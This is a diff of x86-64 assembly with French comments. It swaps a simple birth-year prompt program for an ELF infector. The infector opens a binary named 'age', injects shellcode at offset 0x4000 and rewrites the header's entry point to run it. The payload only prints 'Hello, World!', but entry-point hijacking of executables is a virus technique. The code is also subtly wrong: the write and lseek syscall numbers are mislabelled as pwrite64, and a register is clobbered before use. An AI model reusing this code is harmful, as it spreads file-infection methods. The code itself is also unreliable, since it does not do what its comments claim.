@@ -1,45 +1,74 @@
 section .data
-    prompt db "Entrez votre annee de naissance: ", 0    ; Message affiché à l'utilisateur
-    prompt_len equ $ - prompt                          ; Taille du message
-    year_buffer db 0, 0, 0, 0, 0, 0, 0, 0, 0, 0        ; Buffer pour stocker l'année saisie (max 10 caractères)
-    newline db 0xA, 0                                  ; Saut de ligne
+filename db 'age', 0               ; Nom du fichier ELF cible
+entry_offset equ 0x18              ; Offset de e_entry dans l'en-tête ELF
+shellcode:                         ; Shellcode pour afficher "Hello, World!"
+    call get_message               ; Calculer dynamiquement l'adresse du message
+get_message:
+    pop rsi                        ; Adresse du message dans RSI
+    mov rax, 1                     ; syscall write
+    mov rdi, 1                     ; stdout
+    mov rdx, msg_len               ; Taille du message
+    syscall
+
+    mov rax, 60                    ; syscall exit
+    xor rdi, rdi                   ; Code de retour 0
+    syscall
+
+msg db "Hello, World!", 0xA        ; Le message
+msg_len equ $ - msg                ; Taille du message
+shellcode_size equ $ - shellcode   ; Taille totale du shellcode
 
 section .bss
-    input_len resb 4                                   ; Longueur des données saisies
+buffer resb 32768                  ; Buffer pour stocker le contenu ELF
 
 section .text
 global _start
 
 _start:
-    ; Afficher le prompt
-    mov rax, 1                ; syscall write
-    mov rdi, 1                ; file descriptor (stdout)
-    mov rsi, prompt           ; adresse du message
-    mov rdx, prompt_len       ; longueur du message
+    ; 1. Ouvrir le fichier ELF cible
+    mov rax, 2                    ; sys_open
+    lea rdi, [rel filename]       ; Nom du fichier ELF
+    mov rsi, 2                    ; O_RDWR (lecture/écriture)
+    syscall
+    cmp rax, 0
+    js error_exit
+    mov r8, rax                   ; Sauvegarder le descripteur de fichier
+
+    ; 2. Lire le contenu ELF
+    mov rax, 0                    ; sys_read
+    mov rdi, r8                   ; Descripteur de fichier
+    lea rsi, [rel buffer]         ; Buffer pour lecture
+    mov rdx, 32768                ; Taille maximale
     syscall
 
-    ; Lire l'entrée utilisateur
-    mov rax, 0                ; syscall read
-    mov rdi, 0                ; file descriptor (stdin)
-    mov rsi, year_buffer      ; adresse du buffer pour stocker l'entrée
-    mov rdx, 10               ; nombre maximum de caractères à lire
+    ; 3. Injecter le shellcode à l'offset 0x4000
+    mov rax, 1                    ; sys_pwrite64
+    mov rdi, r8                   ; Descripteur de fichier
+    lea rsi, [rel shellcode]      ; Adresse du shellcode
+    mov rdx, shellcode_size       ; Taille du shellcode
+    mov r10, 0x4000               ; Offset d'injection
     syscall
 
-    ; Afficher la saisie pour vérification
-    mov rax, 1                ; syscall write
-    mov rdi, 1                ; file descriptor (stdout)
-    mov rsi, year_buffer      ; adresse du buffer contenant l'entrée
-    mov rdx, 10               ; longueur maximale affichée
+    ; 4. Modifier l'entrée principale (e_entry)
+    mov rax, 8                    ; sys_pwrite64
+    mov rdi, r8                   ; Descripteur de fichier
+    mov rsi, r10                  ; Nouvelle adresse d'entrée principale (0x4000)
+    mov rdx, 8                    ; Taille de l'adresse
+    mov r10, entry_offset         ; Offset de e_entry (0x18 dans l'en-tête ELF)
     syscall
 
-    ; Saut de ligne
-    mov rax, 1                ; syscall write
-    mov rdi, 1                ; file descriptor (stdout)
-    mov rsi, newline          ; adresse du saut de ligne
-    mov rdx, 1                ; taille du saut de ligne
+    ; 5. Fermer le fichier
+    mov rax, 3                    ; sys_close
+    mov rdi, r8                   ; Descripteur de fichier
     syscall
 
-    ; Quitter le programme
-    mov rax, 60               ; syscall exit
-    xor rdi, rdi              ; code retour 0
+    ; 6. Quitter proprement
+    xor rdi, rdi                  ; Code de sortie 0
+    mov rax, 60                   ; sys_exit
     syscall
+
+error_exit:
+    mov rdi, 1                    ; Code d'erreur 1
+    mov rax, 60                   ; sys_exit
+    syscall
+
